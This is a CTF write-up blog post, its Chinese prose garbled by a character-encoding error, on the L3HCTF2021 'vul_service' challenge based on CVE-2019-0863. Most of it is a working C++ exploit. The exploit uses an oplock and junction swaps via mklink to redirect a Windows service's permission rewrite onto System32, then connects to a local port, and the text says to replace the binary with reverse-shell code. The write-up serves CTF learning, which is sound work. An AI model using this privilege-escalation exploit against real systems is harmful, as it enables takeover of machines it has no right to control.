---
title: L3HCTF2021
date: 2021-11-16 17:59:18
draft: false
tags: ["pwn", "windows"]
categories: ["pwn"]
---

# L3HCTF2021 PWN
èººäº†ä¸ªç¬¬ä¸€ï¼Œè¢«å¸¦é£äº†ã€‚
<!-- more -->
çœ‹äº†ä¸€ä¸‹åªæœ‰è¿™é¢˜å€¼å¾—è®°å½•ğŸ‘‡

## vul_service
### åˆ†æ
é¢˜ç›®æ¥è‡ªCVE-2019-0863ï¼Œæ³¨å†Œäº†ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼ŒåŠŸèƒ½æ˜¯ä¼šä¸æ–­éå†tmpç›®å½•ä¸‹æ–‡ä»¶ï¼Œè¯»å–å…¶æƒé™å¹¶å†™å›å»ï¼Œæ³¨æ„åˆ°æ˜¯æ ¹æ®æ–‡ä»¶åæ¥åˆ¤æ–­å¹¶ä¸”æ²¡æœ‰åŠ é”ï¼Œè€ƒè™‘ä½¿ç”¨TOCTOUæ¥æ”»å‡»ã€‚

å‚è€ƒ[è¿™ç¯‡æ–‡ç« ](https://lucabarile.github.io/Blog/toctou/index.html)äº†è§£TOCTOUï¼Œæ¯”è¾ƒå¥½ç†è§£çš„ä¸€ç§æ¡ä»¶ç«äº‰ï¼Œä½¿ç”¨SetOplockåœ¨è¯»å–æ—¶é”ä½ï¼Œå¹¶ä¿®æ”¹ç¬¦å·é“¾æ¥å³å¯éé¢„æœŸä¿®æ”¹åˆ«çš„æ–‡ä»¶çš„æƒé™ã€‚é€šè¿‡è¿™é‡Œä¸»è¦å­¦åˆ°äº†å¾ˆå¤šwindowsçš„çŸ¥è¯†ï¼Œå¦‚æƒé™æ§åˆ¶çš„DACLï¼Œè®¡åˆ’ä»»åŠ¡ç­‰ã€‚

### æ€è·¯
æ„Ÿè°¢FMYYå’Œ2stçš„å¸®åŠ©ã€‚

é¦–å…ˆåœ¨tmpåŒçº§åˆ›å»ºä¸€ä¸ªtargetç›®å½•ï¼Œå…¶ä¸­åˆ›å»ºåŒåæ–‡ä»¶vul_service.exeï¼Œè¿™é‡Œå»ºè®®ä»system32ä¸­ç›´æ¥å¤åˆ¶å‡ºæ¥å¹¶åˆ é™¤ç»§æ‰¿å…³ç³»ï¼Œè¿™æ ·å°±æœ‰äº†Attackerçš„æƒé™ã€‚

ä¸»è¦æ€è·¯å°±æ˜¯åœ¨tmpåˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥æŒ‡targetï¼Œç”¨SetOplocké”ä½è¯¥åŒåæ–‡ä»¶ã€‚å½“è®¡åˆ’ä»»åŠ¡è®¿é—®æ—¶ï¼Œåˆ é™¤ç¬¦å·é“¾æ¥å¹¶åˆ›å»ºä¸€ä¸ªæŒ‡å‘system32çš„ï¼Œå°±å¯ä»¥æŠŠæƒé™å†™ç»™System32ä¸­çš„æ¼æ´ç¨‹åºï¼Œç„¶åæ›¿æ¢ä¸ºåå¼¹shellçš„æ¶æ„ä»£ç å³å¯ã€‚

### exp
```cpp
#include "stdafx.h"
#include<tchar.h>
#include<strsafe.h>
#include "TcpClient.h"
static FileOpLock* oplock = nullptr;
static bstr_t target_2;
#define BUFSIZE 4096
void HandleOplock()
{

	DebugPrintf("OpLock Triggered");
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

	RemoveDirectoryW(L"C:\\Users\\Public\\tmp\\1");

	WCHAR CMDLine[BUFSIZE];
	ZeroMemory(CMDLine, BUFSIZE);
	StringCchCat(CMDLine, BUFSIZE, L"cmd /c mklink /J C:\\Users\\Public\\tmp\\1  C:\\Windows\\System32");

	CreateProcess(nullptr, CMDLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	Sleep(2000);
	
}

int _tmain(int argc, _TCHAR* argv[])
{
	wprintf_s(L"[+] hrnPA !\n");

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);

	RemoveDirectoryW(L"C:\\Users\\Public\\tmp\\1");

	WCHAR CMDLine[BUFSIZE];
	ZeroMemory(CMDLine, BUFSIZE);
	StringCchCat(CMDLine, BUFSIZE, L"cmd /c mklink /J C:\\Users\\Public\\tmp\\1  C:\\Users\\Public\\target");

	CreateProcess(nullptr, CMDLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	//Sleep(2000);
	int sign = 0;
	if (argc < 2)
	{
		printf("Usage: SetOpLock target [rwdx]\n");
		printf("Share Mode:\n");
		printf("r - FILE_SHARE_READ\n");
		printf("w - FILE_SHARE_WRITE\n");
		printf("d - FILE_SHARE_DELETE\n");
		printf("x - Exclusive lock\n");
		sign = 1;
	}
	else
	{
		LPCWSTR target = argv[1];
		LPCWSTR share_mode = argc > 2 ? argv[2] : L"";

		oplock = FileOpLock::CreateLock(target, share_mode, HandleOplock);
		if (oplock != nullptr)
		{
			oplock->WaitForLock(INFINITE);
			delete oplock;

		}
		else
		{
			printf("Error creating oplock\n");
			return 1;
		}
	}
	if (sign) {
		TcpClient tcpClient;
		int iRes = 0;

		wprintf_s(L"[+] Trigger launched.\n");
		wprintf_s(L"[*] TCP connecting...\n");


		wprintf_s(L"[*] Waiting for the VulService to be Execute...\n");


		Sleep(50000);

		iRes = tcpClient.connectTCP("127.0.0.1", "1337");

		if (iRes != 0)
		{
			wprintf_s(L"[*] Retrying ...\n");

			iRes = tcpClient.connectTCP("127.0.0.1", "1337");
		}

		if (iRes != 0)
		{
			wprintf_s(L"[*] Retrying ...\n");


			iRes = tcpClient.connectTCP("127.0.0.1", "1337");
		}

		if (iRes != 0)
		{
			wprintf_s(L"[-] Exploit failed.");
		}
		else
		{
			wprintf_s(L"[+] Exploit successfull.");
		}
	}
	return 0;
}

```

æ•ˆæœå¦‚ä¸‹ï¼š
![win](./L3HCTF2021/1.png)
æ­¤æ—¶æ›¿æ¢ä¸ºåå¼¹shellçš„æ¶æ„ä»£ç å³å¯ã€‚